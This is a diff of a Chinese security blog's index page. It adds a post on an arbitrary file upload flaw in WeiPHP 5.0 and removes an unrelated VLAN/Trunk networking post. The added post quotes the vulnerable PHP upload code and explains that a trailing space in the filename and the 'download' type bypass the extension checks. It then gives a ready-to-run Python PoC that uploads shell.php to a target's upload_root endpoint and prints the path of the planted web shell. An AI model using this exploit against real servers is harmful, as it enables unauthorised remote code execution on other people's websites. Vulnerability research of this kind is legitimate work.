@@ -55,6 +55,61 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
+    <article id="post-Weiphp5-0任意文件上传" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/30/Weiphp5-0任意文件上传/">Weiphp5.0任意文件上传</a>
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2021/06/30/Weiphp5-0任意文件上传/" class="article-date">
+  <time datetime="2021-06-30T06:45:08.000Z" itemprop="datePublished">2021-06-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/WEB相关/">WEB相关</a>
+  </div>
+
+    
+  </div>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>application\common.php</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_files</span><span class="params">($setting = <span class="string">''</span>, $driver = <span class="string">''</span>, $config = <span class="string">''</span>, $type = <span class="string">'picture'</span>, $isTest = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">        <span class="comment">//判断扩展名是不是php,不支持上传php文件</span></span><br><span class="line">        $info = $file-&gt;getInfo();</span><br><span class="line">        $info = pathinfo($info[<span class="string">'name'</span>]);</span><br><span class="line">        <span class="comment">//这里判断后缀是否为php，可以加空格绕过</span></span><br><span class="line">        <span class="keyword">if</span> (strtolower($info[<span class="string">'extension'</span>]) == <span class="string">'php'</span>) &#123;</span><br><span class="line">            $return[<span class="string">'msg'</span>] = <span class="string">'不支持上传该文件类型'</span>;</span><br><span class="line">            $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">            $redata[$key] = $return;</span><br><span class="line">            <span class="keyword">return</span> $redata;</span><br><span class="line">        &#125;</span><br><span class="line">        $checkRule = [];</span><br><span class="line">        <span class="keyword">if</span> ($type == <span class="string">'picture'</span>) &#123;</span><br><span class="line">            <span class="comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">            $checkRule[<span class="string">'ext'</span>] = <span class="string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">            $checkRule[<span class="string">'size'</span>] = <span class="number">20971520</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $allowExt = input(<span class="string">'allow_file_ext'</span>, <span class="string">''</span>);</span><br><span class="line">            <span class="keyword">if</span> ($allowExt != <span class="string">''</span>) &#123;</span><br><span class="line">                $checkRule[<span class="string">'ext'</span>] = $allowExt;</span><br><span class="line">            &#125;</span><br><span class="line">            $allowSize = input(<span class="string">'allow_file_maxsize'</span>, <span class="string">''</span>);</span><br><span class="line">            <span class="keyword">if</span> ($allowSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                $checkRule[<span class="string">'size'</span>] = $allowSize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $info = $file-&gt;isTest($isTest)</span><br><span class="line">            -&gt;rule(<span class="string">'uniqid'</span>)</span><br><span class="line">            -&gt;validate($checkRule)</span><br><span class="line">            -&gt;move($rootpath, DIRECTORY_SEPARATOR . $saveName);</span><br><span class="line">		...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里$type==’picture’，后面有个调用这个方法的，然后$type==’download’ 绕过了这个限制</p>
+<p>application\home\model\File.php</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($setting = [], $driver = <span class="string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">/* 上传文件 */</span></span><br><span class="line">       $setting[<span class="string">'callback'</span>] = <span class="keyword">array</span>(</span><br><span class="line">           <span class="keyword">$this</span>,</span><br><span class="line">           <span class="string">'isFile'</span></span><br><span class="line">       );</span><br><span class="line">       </span><br><span class="line">       $info = upload_files($setting, $driver, $config, <span class="string">'download'</span>, $isTest);</span><br><span class="line">    ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>application\home\controller\File.php    这里找到了调用upload</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   	<span class="comment">//用户登录检测</span></span><br><span class="line">   	<span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">   		$return = <span class="keyword">array</span>(</span><br><span class="line">   				<span class="string">'status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   				<span class="string">'code'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">   				<span class="string">'info'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">   				<span class="string">'msg'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">   				<span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">   		);</span><br><span class="line">   		<span class="keyword">return</span> json_encode($return);</span><br><span class="line">   	&#125;</span><br><span class="line">       $return = <span class="keyword">array</span>(</span><br><span class="line">           <span class="string">'status'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">           <span class="string">'info'</span> =&gt; <span class="string">'上传成功'</span>,</span><br><span class="line">           <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">       );</span><br><span class="line">       <span class="comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">       $File = D(<span class="string">'home/File'</span>);</span><br><span class="line">       $file_driver = strtolower(config(<span class="string">'picture_upload_driver'</span>));</span><br><span class="line">       $info = $File-&gt;upload(config(<span class="string">'download_upload'</span>), config(<span class="string">'picture_upload_driver'</span>), config(<span class="string">"upload_&#123;$file_driver&#125;_config"</span>));</span><br><span class="line">       <span class="comment">/* 记录附件信息 */</span></span><br><span class="line">       <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">           $return[<span class="string">'code'</span>] = $return[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">           $return = array_merge($info[<span class="string">'download'</span>], $return);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $return[<span class="string">'code'</span>] = $return[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">           $return[<span class="string">'msg'</span>] = $return[<span class="string">'info'</span>] = $File-&gt;getError();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">/* 返回JSON数据 */</span></span><br><span class="line">       <span class="keyword">return</span> json_encode($return);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>构造上传</p>
+<p><img src="/images/Article_images/Clip_20210630_144156.png" alt="Clip_20210630_144156"></p>
+<p>poc</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(target)</span>:</span></span><br><span class="line">	vul=target+<span class="string">'/public/index.php/home/File/upload_root'</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		files=&#123;</span><br><span class="line">		<span class="string">'download'</span>:(<span class="string">'1ight0.php '</span>,open(<span class="string">'shell.php'</span>,<span class="string">'rb'</span>),<span class="string">'image/png'</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		res=requests.post(url=vul,files=files,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>).text</span><br><span class="line">		jsonres=json.loads(res)</span><br><span class="line">		shellpath=target+<span class="string">'/public/uploads/download'</span>+jsonres[<span class="string">'savepath'</span>]+jsonres[<span class="string">'savename'</span>].strip()</span><br><span class="line">		<span class="keyword">if</span> requests.get(url=shellpath,timeout=<span class="number">3</span>,verify=<span class="literal">False</span>).status_code == <span class="number">200</span>:</span><br><span class="line">			print(<span class="string">'shell-----&gt; '</span>,shellpath)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'目标不存在漏洞'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		target=sys.argv[<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">			target=<span class="string">'http://'</span>+target</span><br><span class="line">		poc(target)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">'python poc.py 目标'</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/images/Article_images/Clip_20210630_144355.png" alt="Clip_20210630_144355"></p>
+
+      
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+  
     <article id="post-9-2后台登录绕过" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
@@ -631,57 +686,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
 </article>
 
   
-    <article id="post-VLAN-与-Trunk" class="article global-container article-type-post" itemscope itemprop="blogPost">
-  
-    <header class="article-header">
-      
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/10/06/VLAN-与-Trunk/">VLAN 与 Trunk</a>
-    </h1>
-  
-
-    </header>
-  
-  <div class="article-meta">
-    <a href="/2019/10/06/VLAN-与-Trunk/" class="article-date">
-  <time datetime="2019-10-06T07:36:52.000Z" itemprop="datePublished">2019-10-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/网络工程/">网络工程</a>
-  </div>
-
-    
-  </div>
-  
-
-  <div class="article-inner">
-    
-    <div class="article-content article-content-cloud" itemprop="articleBody">
-      
-        <p>二层交换机就是传统意义上的交换，使用mac地址作为转发依据，建立起mac到端口的映射，，，一般的二层交换机是没有三层功能，也就是不能配置静态路由<br>三层交换则是建立起ip到端口的映射，建立在路由的基础上的。可以理解为二层交换与路由的叠加，实际上，三层交换要强于二层交换与路由的叠加</p>
-<p><strong>简介</strong><br>路由器能够将广播包阻隔在一个接口上，但是，路由器LAN接口数量有限，主要功能是再网络间传输数据，而不是对终端设备提供网络接入。访问LAN的功能还是接入层交换机实现，与三层交换机相似,通过在二层交换机上创建VLAN来减少广播域。现代交换机就是通过VLAN来构建的，因此某种程度上来讲，学习交换机就是学习vlan</p>
-<p>** 什么是VLAN **<br>它是一组与位置无关的逻辑端口，相当于一个独立的三层网络</p>
-<p><strong>什么是trunk</strong><br>Trunk是两个网络设备之间承载多于一种vlan的端到端的连接，将vlan延申至整个网络，没有vlan Trunk，vlan也不会非常有用。vlan trunk允许vlan数据流在交换机间传输，所以设备在同一vlan，但连接到不同交换机，能够不通过路由器来进行通信<br><strong>一个VLAN trunk不属于莫伊特定vlan</strong><br>而是交换机和路由器间多个vlan 的通道。<br>当安装好trunk线之后，帧在trunk线传输就可以使用trunk协议来修改以太网帧。这就意味着交换机端口有不止一种模式，缺省情况下，所有端口被称为接入端口。当一个端口用于交换机间互联传输vlan信息时，这种端口模式改变为trunk，节点路由器通常也不知道vlan的存在并使用标准以太网帧或“untagged”帧，trunk线能够使用“tagged”帧来标记vlan或优先级。<br>因此，在trunk端口，运行trunk协议来允许帧中包含trunk信息<br><img src="/images/Article_images/image04.jpg" alt><br>pc1在经过路由表处理后向pc2发送数据流，这两个节点在同一vlan但不同交换机</p>
-<ul>
-<li>以太网帧离开pc1到达switch1</li>
-<li>以太网1的SAT表明目的地时trunk线的另一端</li>
-<li>switch1使用trunk协议在以太网帧中添加vlan id；</li>
-<li>新帧离开switch1的trunk端口被switch2接收</li>
-<li>源帧按照switch2的sat转发到目的地址（端口4）</li>
-</ul>
-<p>vlan tag 如图所示，包含类型域，优先级域，CFI指示mac数据域，vlan id；<br><img src="/images/Article_images/image05.jpg" alt></p>
-
-      
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-  
 
 
   <nav id="page-nav">
@@ -740,6 +744,10 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
       <ul>
         
           <li>
+            <a href="/2021/06/30/Weiphp5-0任意文件上传/">Weiphp5.0任意文件上传</a>
+          </li>
+        
+          <li>
             <a href="/2021/06/28/9-2后台登录绕过/">youdiancms9.2后台登录绕过&#39;</a>
           </li>
         
@@ -753,10 +761,6 @@ __toString()函数是当对象被当做字符串的时候会自动调用该函�
         
           <li>
             <a href="/2019/10/30/关于php反序列化漏洞小记/">关于php反序列化漏洞小记</a>
-          </li>
-        
-          <li>
-            <a href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
           </li>
         
       </ul>
